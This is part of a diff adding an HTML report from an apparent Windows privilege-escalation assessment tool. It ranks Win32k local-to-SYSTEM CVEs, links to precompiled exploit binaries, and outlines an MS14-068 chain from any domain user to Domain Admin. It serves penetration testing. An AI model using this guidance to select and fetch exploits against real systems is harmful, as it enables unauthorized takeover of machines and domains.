+        </tr>
+        <tr>
+          <td class="rank">#23</td>
+          <td><div class="bar"><div class="fill" style="width:49%;background:#d29922"></div><span>49</span></div></td>
+          <td><span class="verdict" style="color:#d29922">VIABLE</span></td>
+          <td class="cve">
+            <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-0803" target="_blank">CVE-2019-0803</a>
+            <span class="badge likely">LIKELY</span>
+            <div class="desc">Win32k object handling LPE — local SYSTEM</div>
+            <div class="notes">Win32k LPE — SecWiki binary works on most Win7/10 targets</div>
+            <div class="exploit"><div class="method"><span class="mtag bin-tag">BINARY</span><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2019-0803" target="_blank" class="link">Precompiled: SecWiki/CVE-2019-0803 &#8599;</a></div></div>
+          </td>
+          <td class="rel">Good</td>
+          <td class="kb">—</td>
+        </tr>
+        <tr>
+          <td class="rank">#24</td>
+          <td><div class="bar"><div class="fill" style="width:37%;background:#8b949e"></div><span>37</span></div></td>
+          <td><span class="verdict" style="color:#8b949e">FALLBACK</span></td>
+          <td class="cve">
+            <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-1132" target="_blank">CVE-2019-1132</a>
+            <span class="badge likely">LIKELY</span><span class="badge itw">ITW</span><span class="badge kev">CISA KEV</span>
+            <div class="desc">Win32k null-deref EoP — local SYSTEM, exploited ITW by Buhtrap APT (Jul 2019)</div>
+            <div class="notes">Win32k null-deref — ITW by Buhtrap APT (Eastern Europe espionage). Win7/2008 R2 only.</div>
+            <div class="exploit"><div class="method nomethod">No public exploit — manual analysis required</div></div>
+          </td>
+          <td class="rel">Good</td>
+          <td class="kb">—</td>
+        </tr></tbody>
+</table>
+
+<h2 class="section">Exploit Chains <span class="section-sub">context-aware privilege paths</span></h2><div class="chains"><div class="chain"><div class="chain-name">&#9654; Domain user → MS14-068 → Domain Admin</div><div class="chain-note">Any low-priv domain account → forge PAC → instant Domain Admin. Single-shot domain compromise if DC unpatched.</div><div class="chain-cves">CVE-2014-6324</div></div></div>
+
+<div class="foot">
+WinIntel v1.0.0 · For authorized penetration testing only · <a href="https://github.com/drgoteee/winintel">github.com/drgoteee/winintel</a>
+</div>
+<script>
+function cp(btn, text){
+  navigator.clipboard.writeText(text).then(function(){
+    var orig = btn.textContent;
+    btn.textContent = 'copied';
+    btn.classList.add('done');
+    setTimeout(function(){ btn.textContent = orig; btn.classList.remove('done'); }, 1400);
+  }).catch(function(){
+    var t = document.createElement('textarea');
+    t.value = text; document.body.appendChild(t); t.select();
+    try { document.execCommand('copy'); btn.textContent='copied'; btn.classList.add('done'); } catch(e) {}
+    document.body.removeChild(t);
+    setTimeout(function(){ btn.textContent='copy'; btn.classList.remove('done'); }, 1400);
+  });
+}
+</script>
+</body></html>
